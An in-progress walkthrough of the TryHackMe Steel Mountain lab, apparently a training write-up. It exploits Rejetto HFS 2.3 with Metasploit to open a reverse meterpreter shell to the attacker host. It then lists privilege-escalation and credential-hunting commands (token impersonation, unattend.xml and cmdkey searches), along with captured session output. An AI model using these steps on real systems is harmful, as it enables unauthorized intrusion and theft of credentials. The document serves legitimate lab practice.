# Steel Mountain (THM) — Walkthrough (Guided)

Status: In Progress (foothold repeatedly confirmed; SYSTEM privesc still in progress)
Target: 10.146.141.173
Scope: Authorized TryHackMe lab target only
Last validated (UTC): 2026-05-22 23:10:00Z

## Goal of this walkthrough
This page is written so someone can follow it step-by-step:
1) confirm the exposed service,
2) get initial shell access,
3) enumerate privilege escalation paths,
4) progress toward SYSTEM and final proof.

## Prerequisites
- Active THM VPN with exactly one tun interface.
- Kali/Parrot attacker host.
- Metasploit installed.

Quick preflight:
```bash
ip -br a | grep -E '^tun[0-9]'
```
Expected: one active tunnel only.

Find your callback IP:
```bash
ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1
```

## Step 1 — Recon and service fingerprinting
Run:
```bash
nmap -Pn -n -p80,8080 -sV 10.146.141.173
curl -sI http://10.146.141.173:8080 | head
```

Expected indicators:
- tcp/8080 shows HttpFileServer 2.3
- HTTP header includes `Server: HFS 2.3`

Proof captured:
```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 8.5
8080/tcp open  http    HttpFileServer httpd 2.3

HTTP/1.1 200 OK
Server: HFS 2.3
```

## Step 2 — Initial access via Rejetto HFS exploit
Start Metasploit:
```bash
msfconsole
```

In msfconsole:
```text
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.146.141.173
set RPORT 8080
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_TUN_IP>
set LPORT 4444
run -z
```

Verify session:
```text
sessions -l
```

Proof captured:
```text
[*] Meterpreter session 1 opened (192.168.129.182:4444 -> 10.146.141.173:49395)

Id  Type                     Information                         Connection
1   meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4444 -> 10.146.141.173:49395
```

## Step 3 — Stabilize one session and baseline host context
Use one active session ID from `sessions -l`:
```text
sessions -i <ID>
getuid
sysinfo
shell
whoami
whoami /priv
```

What to record:
- current user (expected foothold user: `STEELMOUNTAIN\bill`)
- integrity/privileges from `whoami /priv`
- OS/build from `sysinfo`

## Step 4 — PrivEsc methodology branches (guided order)
If one branch stalls, move to the next. Do not loop only one command.

### Branch A: token/SYSTEM checks
```text
getsystem
load incognito
list_tokens -u
```
Objective: identify direct SYSTEM path or impersonation candidate.

### Branch B: local exploit suggestions + system enum
```text
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_system
```
Objective: produce candidate local privesc vectors tied to patch level/services.

### Branch C: services and scheduled tasks
```text
shell -c sc query state^= all
shell -c schtasks /query /fo LIST /v
```
Objective: find weak service/task configs usable for escalation.

### Branch D: credential/secrets paths
```text
shell -c cmdkey /list
shell -c dir C:\ /b /s *unattend*.xml
```
Objective: recover stored credentials or unattended install secrets.

## Step 5 — Proof checkpoints to keep while working
Minimum checkpoints for a reproducible walkthrough:
1) recon proof (service + version),
2) foothold proof (session open + `sessions -l`),
3) privesc milestone proof (`NT AUTHORITY\SYSTEM` or equivalent evidence).

When SYSTEM is achieved, capture:
```text
getuid
shell -c whoami
```
Expected: `NT AUTHORITY\SYSTEM`.

## Snapshots (current session)
### Snapshot 1 — Service discovery
Time (UTC): 2026-05-22 22:04:45Z
- HFS 2.3 confirmed on 8080.
- IIS 8.5 confirmed on 80.

### Snapshot 2 — First validated foothold
Time (UTC): 2026-05-22 22:24:24Z
- Meterpreter session opened.
- Session context: `STEELMOUNTAIN\bill @ STEELMOUNTAIN`.

### Snapshot 3 — Foothold reliability
Time (UTC): 2026-05-22 22:41:15Z
- Additional Meterpreter sessions opened in later cycles.
- Confirms exploit path reliability.

## Timeline (signal only)
- 2026-05-22 22:04:45Z — Recon confirms IIS 8.5 (80) + HFS 2.3 (8080).
- 2026-05-22 22:24:24Z — First Meterpreter foothold opened as bill.
- 2026-05-22 22:37:20Z — Additional foothold opened (repeatability confirmed).
- 2026-05-22 22:41:11Z / 22:41:15Z — More Meterpreter sessions opened.
- 2026-05-22 23:00:00Z — Escalation workflow shifted to branch-based methodology.

## Current assessment
- Initial access path is stable and reproducible.
- Next technical milestone is SYSTEM proof with clean command/output evidence.
- This page will be updated with the exact privesc path once SYSTEM is confirmed.
